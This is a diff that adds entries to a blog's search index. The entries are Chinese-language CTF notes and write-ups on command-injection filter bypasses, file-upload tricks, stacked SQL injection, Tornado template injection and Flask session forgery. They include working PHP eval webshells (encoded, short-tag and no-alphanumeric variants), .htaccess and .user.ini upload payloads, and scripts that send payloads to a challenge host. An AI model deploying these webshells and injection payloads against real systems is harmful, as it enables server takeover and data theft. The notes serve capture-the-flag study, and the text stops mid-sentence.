@@ -4,6 +4,189 @@
   
     
     <entry>
+      <title>命令执行</title>
+      <link href="/2020/05/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+      <url>/2020/05/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
+      
+        <content type="html"><![CDATA[<p>转自<a href="https://blog.csdn.net/qq_43431158/article/details/105422347" target="_blank" rel="noopener">CTF下的命令执行</a></p><h1 id="0x00空格绕过"><a href="#0x00空格绕过" class="headerlink" title="0x00空格绕过"></a><strong>0x00空格绕过</strong></h1><pre><code>常见的绕过符号有：$IFS$9 、${IFS} 、%09(php环境下)、 重定向符&lt;&gt;、&lt;、$IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名，加一个{}就固定了变量名，$IFS$9后面之所以加个$是为了起到截断的作用</code></pre><h1 id="0x01命令分隔"><a href="#0x01命令分隔" class="headerlink" title="0x01命令分隔"></a><strong>0x01命令分隔</strong></h1><pre><code>%0a  --换行符，需要php环境%0d  --回车符，需要php环境;  --在 shell 中，是”连续指令”&amp;  --不管第一条命令成功与否，都会执行第二条命令&amp;&amp;  --第一条命令成功，第二条才会执行|  --第一条命令的结果，作为第二条命令的输入||  --第一条命令失败，第二条才会执行</code></pre><h1 id="0x02关键词过滤"><a href="#0x02关键词过滤" class="headerlink" title="0x02关键词过滤"></a><strong>0x02关键词过滤</strong></h1><h2 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a><strong>拼接绕过</strong></h2><pre><code>#执行ls命令：a=l;b=s;$a$b#cat flag文件内容：a=c;b=at;c=f;d=lag;$a$b ${c}${d}#cat test文件内容a=&quot;ccaatt&quot;;b=${a:0:1}${a:2:1}${a:4:1};$b test</code></pre><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a><strong>编码绕过</strong></h2><pre><code>#base64echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|bash ==&gt;cat /flagecho Y2F0IC9mbGFn|base64 -d|sh==&gt;cat /flag#hexecho &quot;0x636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag#oct/字节$(printf &quot;\154\163&quot;) ==&gt;ls$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) ==&gt;cat /flag{printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;}|\$0 ==&gt;cat /flag#i也可以通过这种方式写马内容为&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;${printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;} &gt;&gt; 1.php</code></pre><h2 id="单引号和双引号绕过"><a href="#单引号和双引号绕过" class="headerlink" title="单引号和双引号绕过"></a><strong>单引号和双引号绕过</strong></h2><pre><code>c&#39;a&#39;t testc&quot;a&quot;t test</code></pre><h2 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a><strong>反斜杠绕过</strong></h2><pre><code>ca\t test</code></pre><h2 id="通过-PATH绕过"><a href="#通过-PATH绕过" class="headerlink" title="通过$PATH绕过"></a><strong>通过$PATH绕过</strong></h2><pre><code>#echo $PATH 显示当前PATH环境变量，该变量的值由一系列以冒号分隔的目录名组成#当执行程序时，shell自动跟据PATH变量的值去搜索该程序#shell在搜索时先搜索PATH环境变量中的第一个目录，没找到再接着搜索，如果找到则执行它，不会再继续搜索echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`echo $PATH| cut -c 8,9`t test</code></pre><p><img src="/2020/05/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20200509105742249-1588993641212.png" alt></p><h2 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a><strong>通配符绕过</strong></h2><pre><code>[…]表示匹配方括号之中的任意一个字符{…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。{…}与[…]有一个重要的区别，当匹配的文件不存在，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开</code></pre><pre><code>cat t?stcat te*cat t[a-z]stcat t{a,b,c,d,e,f}st</code></pre><h2 id="linux中查看文件内容的命令"><a href="#linux中查看文件内容的命令" class="headerlink" title="linux中查看文件内容的命令"></a><strong>linux中查看文件内容的命令</strong></h2><pre><code>cat、tac、more、less、head、tail、nl、sed、sort、uniq、od</code></pre><h1 id="0x03内联执行"><a href="#0x03内联执行" class="headerlink" title="0x03内联执行"></a><strong>0x03内联执行</strong></h1><p>内联执行将反引号内命令的输出作为输入执行，类似的还有$(command)</p><pre><code>cat$IFS$9`ls`</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 安全杂项 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 命令执行 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>php伪协议</title>
+      <link href="/2020/05/08/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
+      <url>/2020/05/08/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> 安全杂项 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> php </tag>
+            
+            <tag> 伪协议 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>python</title>
+      <link href="/2020/05/06/python/"/>
+      <url>/2020/05/06/python/</url>
+      
+        <content type="html"><![CDATA[<h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><pre><code class="python">import hashlibdef md5(s):    md5 = hashlib.md5()     md5.update(s.encode(&quot;utf8&quot;))     return md5.hexdigest()</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 备忘录 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>过滤scandir的检索目录方法</title>
+      <link href="/2020/05/06/%E8%BF%87%E6%BB%A4scandir%E7%9A%84%E6%A3%80%E7%B4%A2%E7%9B%AE%E5%BD%95%E6%96%B9%E6%B3%95/"/>
+      <url>/2020/05/06/%E8%BF%87%E6%BB%A4scandir%E7%9A%84%E6%A3%80%E7%B4%A2%E7%9B%AE%E5%BD%95%E6%96%B9%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<p>过滤了scandir，可以考虑用glob://然后用next索引挨个列目录，脚本如下：</p><pre><code class="python">import requestsn=&#39;$it-&gt;next();&#39;p=&#39;printf(&quot;%s: %.1FK&lt;br /&gt;&quot;, $it-&gt;getFilename(), $it-&gt;getSize()/1024);&#39;for i in range(1,20):    url=&#39;http://129.204.185.9:8848/?c=$it = new DirectoryIterator(&quot;glob:///*&quot;);&#39;    url=url+n*(i-1)+p    #print(url)    print(requests.get(url).text)</code></pre><p><img src="/2020/05/06/%E8%BF%87%E6%BB%A4scandir%E7%9A%84%E6%A3%80%E7%B4%A2%E7%9B%AE%E5%BD%95%E6%96%B9%E6%B3%95/image-20200506114537624.png" alt></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 安全杂项 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> php </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>upload</title>
+      <link href="/2020/05/06/upload/"/>
+      <url>/2020/05/06/upload/</url>
+      
+        <content type="html"><![CDATA[<h1 id="session"><a href="#session" class="headerlink" title="session"></a>session</h1><pre><code class="python">import requestsn=&#39;$it-&gt;next();&#39;p=&#39;printf(&quot;%s: %.1FK&lt;br /&gt;&quot;, $it-&gt;getFilename(), $it-&gt;getSize()/1024);&#39;for i in range(1,10):    url=&#39;http://129.204.185.9:8848/?c=session_start();$_SESSION[&quot;b&quot;]=&quot;|N;&lt;?php eval(\$_POST[0]);?&gt;&quot;;$it = new DirectoryIterator(&quot;glob:///tmp/*&quot;);&#39;    url=url+n*(i-1)+p    #print(url)    print(requests.get(url).text)</code></pre><h1 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h1><pre><code>Addtype application/x-httpd-p\hp .jpg</code></pre><h1 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h1><pre><code>GIF89a                  //绕过exif_imagetype()auto_prepend_file=a.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。auto_append_file=a.jpg  //解析后进行包含</code></pre><p>然后再上传<code>a.jpg</code></p><pre><code class="php">0x00GIF89a  &lt;script language=&#39;php&#39;&gt; @eval($_POST[&#39;pass&#39;]);&lt;/script&gt;0x01#define test_width 16#define test_height 7&lt;script language=&#39;php&#39;&gt; @eval($_POST[&#39;pass&#39;]);&lt;/script&gt;</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 备忘录 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> upload </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>De1CTF 2020</title>
+      <link href="/2020/05/06/De1CTF-2020/"/>
+      <url>/2020/05/06/De1CTF-2020/</url>
+      
+        <content type="html"><![CDATA[<p>赛后学习</p><p>参考:</p><p><a href="https://www.cnblogs.com/W4nder/p/12829102.html" target="_blank" rel="noopener">https://www.cnblogs.com/W4nder/p/12829102.html</a></p><p><a href="https://www.cnblogs.com/poing/p/12831304.html" target="_blank" rel="noopener">https://www.cnblogs.com/poing/p/12831304.html</a></p><h1 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h1><h2 id="知识点：-htaccess上传"><a href="#知识点：-htaccess上传" class="headerlink" title="知识点：.htaccess上传"></a>知识点：.htaccess上传</h2><p>waf：</p><p><img src="/2020/05/06/De1CTF-2020/image-20200506105826591.png" alt></p><p>上传.htaccess</p><p>过滤了ph，用换行进行拼接</p><pre><code>Addtype application/x-httpd-p\hp .jpg</code></pre><p><img src="/2020/05/06/De1CTF-2020/image-20200506111914464.png" alt></p><p>shell内容里的php用短标签绕过：</p><pre><code class="php">&lt;?=eval($_REQUEST[1]);</code></pre><p><code>&lt;?=</code>    等价于    <code>&lt;?php echo</code></p><p>从php 5.4.0开始，&lt;?=总是可用的</p><p><img src="/2020/05/06/De1CTF-2020/image-20200506111936759.png" alt></p><p><img src="/2020/05/06/De1CTF-2020/image-20200506111850688.png" alt></p><p>htaccess启用cgi，执行bash脚本：</p><pre><code>Options +ExecCGIAddHandler cgi-script .sh</code></pre><pre><code class="bash">#!/bin/bashecho &quot;Content-Type: text/plain&quot;echo &quot;&quot;cat /flagexit 0</code></pre><h1 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a>Hard_Pentest_1</h1><h2 id="知识点：无字母数字webshell，内网渗透"><a href="#知识点：无字母数字webshell，内网渗透" class="headerlink" title="知识点：无字母数字webshell，内网渗透"></a>知识点：无字母数字webshell，内网渗透</h2><p>源码：</p><pre><code class="php"> &lt;?php//Clear the uploads directory every hourhighlight_file(__FILE__);$sandbox = &quot;uploads/&quot;. md5(&quot;De1CTF2020&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;]);@mkdir($sandbox);@chdir($sandbox);if($_POST[&quot;submit&quot;]){    if (($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 2048) &amp;&amp; Check()){        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0){            die($_FILES[&quot;file&quot;][&quot;error&quot;]);        }        else{            $filename=md5($_SERVER[&#39;REMOTE_ADDR&#39;]).&quot;_&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];            move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $filename);            echo &quot;save in:&quot; . $sandbox.&quot;/&quot; . $filename;        }    }    else{        echo &quot;Not Allow!&quot;;    }}function Check(){    $BlackExts = array(&quot;php&quot;);//后缀不能是php    $ext = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);    $exts = trim(end($ext));    $file_content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);    //内容不能包含字母数字分号等    if(!preg_match(&#39;/[a-z0-9;~^`&amp;|]/is&#39;,$file_content)  &amp;&amp;         !in_array($exts, $BlackExts) &amp;&amp;         !preg_match(&#39;/\.\./&#39;,$_FILES[&quot;file&quot;][&quot;name&quot;])) {          return true;    }    return false;}?&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;upload&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>webshell：(利用array取值，逐次++，拼接POST)</p><pre><code class="php">&lt;?=$_=[]?&gt;&lt;?=$_=@&quot;$_&quot;?&gt;&lt;?=$_=$_[&#39;!&#39;==&#39;@&#39;]?&gt;&lt;?=$___=$_?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?= $___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$____=&#39;_&#39;?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$_=$$____?&gt;&lt;?=$_[__]($_[_],$_[___])?&gt;</code></pre><p><img src="/2020/05/06/De1CTF-2020/image-20200506100940076.png" alt></p><p>上传之后再写入shell：</p><pre><code class="php">__=system&amp;_=echo ^&lt;?php eval($_REQUEST[a]); &gt; a.php</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> writeup </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> upload </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>BUUCTF 平台</title>
+      <link href="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/"/>
+      <url>/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/</url>
+      
+        <content type="html"><![CDATA[<p><a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">BUUCTF平台</a></p><h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><pre><code class="php"> &lt;?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&amp;$page)        {            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) {                echo &quot;you can&#39;t see it&quot;;                return false;            }            if (in_array($page, $whitelist)) {                return true;            }            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );//取第一个？前面的内容            if (in_array($_page, $whitelist)) {                return true;            }            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) {                return true;            }            echo &quot;you can&#39;t see it&quot;;            return false;        }    }    if (! empty($_REQUEST[&#39;file&#39;])        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])    ) {        include $_REQUEST[&#39;file&#39;];        exit;    } else {        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;    }  ?&gt; </code></pre><p><code>payload:file=source.php?../../../../../../ffffllllaaaagggg</code><br>原理是<code>source.php?</code>被当成目录，往上跳目录即可</p><p>phpmyadmin4.8.1远程文件包含漏洞(CVE-2018-12613)</p><h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p><code>waf：preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p><p><code>1&#39;;show databases;</code></p><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200506093253860.png" alt></p><p><code>1&#39;;show tables;</code></p><p>查询数据库supersqli<br><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200506093344815.png" alt><br>表名1919810931114514、words<br>猜测后台SQL语句应该为：<br>select * from supersqli.words where id=’’ ;</p><h2 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h2><p>将1919810931114514表改名为words，这样在后台SQL语句不变的情况下仍然可以查询得到flag的内容<br>`payload:’</p><pre><code>1&#39;;alter table `1919810931114514` add `id` INT(11) NOT NULL DEFAULT &#39;1&#39; after `flag`;rename table words to xxx;rename table `1919810931114514` to words;desc words;</code></pre><p>由于1919810931114514表中没有id列，先加上，再改名，接着查询id=1即可获得flag</p><h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p><code>payload:</code></p><pre><code>1&#39;;create procedure vk()begin  Set @v_sql=concat(&#39;sel&#39;,&#39;ect * from `1919810931114514`;&#39;);  Prepare stmt from @v_sql;  EXECUTE stmt;  deallocate Prepare stmt;end;call vk();-- -</code></pre><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200506093442067.png" alt></p><h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><h2 id="堆叠注入-1"><a href="#堆叠注入-1" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>赛后源码：</p><pre><code class="php">&lt;?php    session_start();    include_once &quot;config.php&quot;;    $post = array();    $get = array();    global $MysqlLink;    //GetPara();    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);    if(!$MysqlLink){        die(&quot;Mysql Connect Error!&quot;);    }    $selectDB = mysqli_select_db($MysqlLink,$dataName);    if(!$selectDB){        die(&quot;Choose Database Error!&quot;);    }    foreach ($_POST as $k=&gt;$v){        if(!empty($v)&amp;&amp;is_string($v)){            $post[$k] = trim(addslashes($v));        }    }    foreach ($_GET as $k=&gt;$v){        }    }    //die();    ?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php    if(isset($post[&#39;query&#39;])){        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;        //var_dump(preg_match(&quot;/{$BlackList}/is&quot;,$post[&#39;query&#39;]));        if(preg_match(&quot;/{$BlackList}/is&quot;,$post[&#39;query&#39;])){            //echo $post[&#39;query&#39;];            die(&quot;Nonono.&quot;);        }        if(strlen($post[&#39;query&#39;])&gt;40){            die(&quot;Too long.&quot;);        }        $sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;        mysqli_multi_query($MysqlLink,$sql);        do{            if($res = mysqli_store_result($MysqlLink)){                while($row = mysqli_fetch_row($res)){                    print_r($row);                }            }        }while(@mysqli_next_result($MysqlLink));    }    ?&gt;</code></pre><p>看到mysql_multi_query()，可以堆叠注入</p><p>预期解：</p><p>通过设置sql_mode为PIPES_AS_CONCAT后可改变’||’的含义为连接字符串。</p><blockquote><p>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能</p></blockquote><p>原本||为或运算符，查询到数据后即跳过后面flag的查询，通过改变||含义可同时查询。</p><p>payload：</p><pre><code class="sql">1;set sql_mode=PIPES_AS_CONCAT;select 1</code></pre><p>非预期：</p><p>payload：</p><pre><code class="sql">*,1</code></pre><h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><h2 id="tornado模板注入"><a href="#tornado模板注入" class="headerlink" title="tornado模板注入"></a>tornado模板注入</h2><p>url形式：</p><p>http://<em>.</em>…../file?filename=…&amp;filehash=…</p><p>提示：</p><table><thead><tr><th>Orz.txt</th><th align="left">render()</th></tr></thead><tbody><tr><td>hint.txt</td><td align="left">md5(cookie_secret + md5(filename))</td></tr><tr><td>flag.txt</td><td align="left">/fllllllllllag</td></tr></tbody></table><p>python <em>SSTI</em> <em>tornado</em> render模板注入</p><p><code>handler.settings</code>存放了cookie_secret</p><p>读取：</p><p><code>http://2c242c65-ae5c-47b1-b55d-db7d12a8092c.node3.buuoj.cn/error?msg=</code></p><p><code>{&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;3dc1711e-a7cd-4490-8d97-c5f08de17a41&#39;}</code></p><pre><code class="pyhon">import hashlibdef md5(s):    md5 = hashlib.md5()     md5.update(s.encode(&quot;utf8&quot;))     return md5.hexdigest()if __name__ == &#39;__main__&#39;:    filename = &#39;/fllllllllllllag&#39;    cookie_secret = &#39;3dc1711e-a7cd-4490-8d97-c5f08de17a41&#39;    print(md5(cookie_secret+md5(filename)))</code></pre><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200506171131986.png" alt></p><h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><h2 id="flask-session伪造"><a href="#flask-session伪造" class="headerlink" title="flask session伪造"></a>flask session伪造</h2><p>decode1:</p><pre><code class="python">#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload):    payload, sig = payload.rsplit(b&#39;.&#39;, 1)    payload, timestamp = payload.rsplit(b&#39;.&#39;, 1)    decompress = False    if payload.startswith(b&#39;.&#39;):        payload = payload[1:]        decompress = True    try:        payload = base64_decode(payload)    except Exception as e:        raise Exception(&#39;Could not base64 decode the payload because of &#39;                         &#39;an exception&#39;)    if decompress:        try:            payload = zlib.decompress(payload)        except Exception as e:            raise Exception(&#39;Could not zlib decompress the payload before &#39;                             &#39;decoding the payload&#39;)    return session_json_serializer.loads(payload)if __name__ == &#39;__main__&#39;:    print(decryption(sys.argv[1].encode()))</code></pre><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200508104620522.png" alt></p><p>decode2：</p><p><a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a></p><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200508110623682.png" alt></p><p>secret key：</p><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200508104651636.png" alt></p><p>encode：</p><p><a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a></p><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200508110338113.png" alt></p><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200508104958199.png" alt></p><p>仍未成功，仅记录一下flask session伪造。</p><h2 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h2><p>改密码、注册、登录均使用strlower()来将用户名转小写</p><pre><code class="python">def strlower(username):    username = nodeprep.prepare(username)    return username</code></pre><p>odeprep.prepare函数转换时过程如下：</p><pre><code class="shell">ᴬᴰᴹᴵᴺ -&gt; ADMIN -&gt; admin</code></pre><p>注册ᴬᴰᴹᴵᴺ用户、登录时经过一次strlower()转换为ADMIN；</p><p>再修改密码、再经过一次strlower()转换为admin，即修改了admin的密码。</p><p>字符：<a href="https://unicode-table.com/cn/1D2C/" target="_blank" rel="noopener">https://unicode-table.com/cn/1D2C/</a></p><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>源码：</p><pre><code class="php"> &lt;?phperror_reporting(0);if(!isset($_GET[&#39;num&#39;])){    show_source(__FILE__);}else{        $str = $_GET[&#39;num&#39;];        $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];        foreach ($blacklist as $blackitem) {                if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) {                        die(&quot;what are you want to do?&quot;);                }        }        eval(&#39;echo &#39;.$str.&#39;;&#39;);}?&gt;</code></pre><h2 id="PHP字符串解析特性"><a href="#PHP字符串解析特性" class="headerlink" title="PHP字符串解析特性"></a>PHP字符串解析特性</h2><p>参考：<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a></p><p> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p><p>1.删除空白符</p><p> 